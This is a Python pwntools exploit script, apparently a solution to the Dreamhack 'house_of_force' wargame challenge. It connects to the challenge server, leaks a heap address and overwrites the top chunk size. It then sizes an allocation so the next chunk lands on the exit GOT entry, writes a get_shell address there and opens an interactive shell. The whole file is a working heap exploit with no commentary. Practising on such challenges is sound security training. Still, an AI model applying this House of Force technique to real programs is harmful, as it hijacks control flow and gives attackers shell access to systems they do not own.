from pwn import *

# nc host3.dreamhack.games 24378
p = remote("host3.dreamhack.games", 24378)
# p = process("./house_of_force")
e = ELF("./house_of_force")

get_shell = 0x804887e

# context.log_level = "debug"

def create(size, data):
    p.sendlineafter(">", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)
    
def write(ptr_idx, write_idx, value):
    p.sendlineafter(">", "2")
    p.sendlineafter("x: ", str(ptr_idx))
    p.sendlineafter("x: ", str(write_idx))
    p.sendlineafter("e: ", value)


create(10, p32(0))

buf_1_addr = int(p.recv(9), 16)
top_chunk_addr = buf_1_addr + 0x8
print("buf_1_addr: " + hex(buf_1_addr))

write(0, 3, str(4294967295))

size = e.got["exit"] - top_chunk_addr - 0x10 - 0x8
# print("size: " + size)
create(size, "A" * 4) 
create(0x100, p32(get_shell))
input()

# write(100, 100, "A")
# create(0x10, "A" * 4)

p.interactive()